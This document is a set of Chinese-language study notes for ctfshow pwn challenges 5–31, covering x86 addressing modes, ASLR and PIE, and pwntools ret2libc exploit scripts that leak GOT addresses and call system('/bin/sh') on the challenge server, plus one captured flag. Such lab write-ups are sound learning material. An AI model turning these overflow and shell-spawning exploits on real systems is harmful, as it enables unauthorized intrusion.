# pwn5~pwn12

寄存器寻址相关知识

``` assembly
section .data
    msg db "Welcome_to_CTFshow_PWN", 0

section .text
    global _start

_start:

; 立即寻址方式
    mov eax, 11         ; 将11赋值给eax
    add eax, 114504     ; eax加上114504
    sub eax, 1          ; eax减去1

; 寄存器寻址方式
    mov ebx, 0x36d      ; 将0x36d赋值给ebx
    mov edx, ebx        ; 将ebx的值赋值给edx

; 直接寻址方式
    mov ecx, msg      ; 将msg的地址赋值给ecx

; 寄存器间接寻址方式
    mov esi, msg        ; 将msg的地址赋值给esi
    mov eax, [esi]      ; 将esi所指向的地址的值赋值给eax

; 寄存器相对寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    add ecx, 4          ; 将ecx加上4
    mov eax, [ecx]      ; 将ecx所指向的地址的值赋值给eax

; 基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 2          ; 将2赋值给edx
    mov eax, [ecx + edx*2]  ; 将ecx+edx*2所指向的地址的值赋值给eax

; 相对基址变址寻址方式
    mov ecx, msg        ; 将msg的地址赋值给ecx
    mov edx, 1          ; 将1赋值给edx
    add ecx, 8          ; 将ecx加上8
    mov eax, [ecx + edx*2 - 6]  ; 将ecx+edx*2-6所指向的地址的值赋值给eax

; 输出字符串
    mov eax, 4          ; 系统调用号4代表输出字符串
    mov ebx, 1          ; 文件描述符1代表标准输出
    mov ecx, msg        ; 要输出的字符串的地址
    mov edx, 22         ; 要输出的字符串的长度
    int 0x80            ; 调用系统调用

; 退出程序
    mov eax, 1          ; 系统调用号1代表退出程序
    xor ebx, ebx        ; 返回值为0
    int 0x80            ; 调用系统调用

```

# pwn13~16

**缺**：C -> elf 全过程

pwn15 汇编编译指令：

```
nasm -f elf64 flag.asm # 将flag.asm编译成64为.o文件
nasm -f elf64 flag.s # 将flag.asm编译成64为.o文件
```

# pwn17~19

**缺**：定向输出流

pwn19 关闭了输出流，我们nc连接之后可以使用 >&0定向到输入流。

``` bash
cat ctfshow_flag >&0               
ctfshow{981fa69c-8b46-4ce8-a53b-48f8acc05e14}
```

一些nc交互小寄巧

# pwn20~22

**缺**：objdump和readelf的使用

一些RELRO保护的查看

# pwn23

栈溢出？但是为什么不构造呢

# pwn24

栈溢出，shellcode，没有开NX直接传就可以

# pwn25

栈溢出libc调用，没有什么特殊的，可以`puts(got_addr)`或者`write(0,got_addr,4)`泄露.

``` python
#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
#sh = process('./pwn')
sh =remote('pwn.challenge.ctf.show', 28186)
context.log_level = 'debug' 

elf = ELF('./pwn')

puts_plt = elf.plt['puts']
setvbuf_got = elf.got['setvbuf']
main = elf.symbols['main']

payload = flat(['A' * (0x88 + 4), puts_plt, main,  setvbuf_got])
sh.sendline( payload)


setvbuf_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('setvbuf', setvbuf_addr)
libcbase = setvbuf_addr - libc.dump('setvbuf')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

payload = flat(['A' * (0x88+4), system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

# pwn26~29

**缺**：ALSR机制

pwn26本题ida反编译：

``` c
  puts("Here is your ASLR level:");
  system("cat /proc/sys/kernel/randomize_va_space");
  puts("If the result is 0, then you get the correct flag!");
  puts("If not,you will get a fake flag!");
  printf("flag is :ctfshow{%p", main);
  printf("_%p", system);
  printf("_%p", ptr);
  printf("_%p", v5);
  puts("}");
```

需要将自己的randomize_va_space的level设置为0，再root用户权限下更改即可。

pwn27：`puts("If the result is 0 or 1, then you get the correct flag!");`同理。

pwn28：不论是否开启ALSR，函数本身的地址是不会变化的

pwn29：SLR和PIE开启后，地址都会将随机化，这里值得注意的是，由于粒度问题，虽然地址都被随机化了，但是被随机化的都仅仅是某个对象的起始地址，而在其内部还是原来的结构，也就是相对偏移是不会变化的。

# pwn30

正常libc。

``` python
#!/usr/bin/env python
from pwn import *
from LibcSearcher import LibcSearcher
#sh = process('./pwn')u
sh =remote('pwn.challenge.ctf.show', 28143)
context.log_level = 'debug' 

elf = ELF('./pwn')

puts_plt = elf.plt['puts']
setvbuf_got = elf.got['setvbuf']
main = elf.symbols['main']

payload = flat(['A' * (0x88 + 4), puts_plt, main,  setvbuf_got])
sh.sendline( payload)

setvbuf_addr = u32(sh.recv()[0:4])
libc = LibcSearcher('setvbuf', setvbuf_addr)
libcbase = setvbuf_addr - libc.dump('setvbuf')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

payload = flat(['A' * (0x88+4), system_addr, 0xdeadbeef, binsh_addr])
sh.sendline(payload)

sh.interactive()
```

# pwn31

开了ALSR和PIE，但程序泄露了`main()`的真实地址，根据main的真实地址可以计算出各个函数的地址偏移量，然后正常libc解题即可。

``` c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  setvbuf(stdin, 0, 1, 0);
  setvbuf(stdout, 0, 2, 0);
  printf("%p\n", main);
  ctfshow(&argc);
  puts(asc_854);
  puts(asc_8C8);
  puts(asc_944);
  puts(asc_9D0);
  puts(asc_A60);
  puts(asc_AE4);
  puts(asc_B78);
  puts("    * *************************************                           ");
  puts(aClassifyCtfsho);
  puts("    * Type  : Linux_Security_Mechanisms                               ");
  puts("    * Site  : https://ctf.show/                                       ");
  puts("    * Hint  : Bypass ALSR & PIE ");
  puts("    * *************************************                           ");
  write(0, "Hello CTFshow!\n", 0xEu);
  return 0;
}
```

但是这道题按照正常的payload数据填充会报错：

<pre>[<span style="color:#EC0101"><b>DEBUG</b></span>] Received 0x2b bytes:
    b&apos;timeout: the monitored command dumped core\n&apos;
</pre>

猜测可能和堆栈平衡有关？留着等后续学习解决吧。这里需要把第一个payload的ebx填充上才不会报错。

``` python
from pwn import *
from LibcSearcher import *

context.log_level = 'debug'
sh = remote("pwn.challenge.ctf.show", 28135)

elf = ELF('./pwn')

main_real = int(sh.recvline(),16)
#main_real = u32(sh.recv(4))
elf_base = main_real - elf.symbols['main']
ctfshow_addr = elf_base + elf.symbols['ctfshow']
write_plt = elf_base + elf.plt['write']
setvbuf_got = elf_base + elf.got['setvbuf']

ebx = elf_base + 0x1fc0

payload1 = flat(['a'*(0x88-4), ebx, 'a'*4,write_plt, ctfshow_addr, 1, setvbuf_got, 4])
sh.sendline(payload1)

setvbuf_addr = u32(sh.recv(4))
libc = LibcSearcher('setvbuf', setvbuf_addr)
libcbase = setvbuf_addr - libc.dump('setvbuf')
system_addr = libcbase + libc.dump('system')
binsh_addr = libcbase + libc.dump('str_bin_sh')

payload2 = flat(['A' * (0x88+4), system_addr, ctfshow_addr, binsh_addr])
sh.sendline(payload2)

sh.interactive()
```

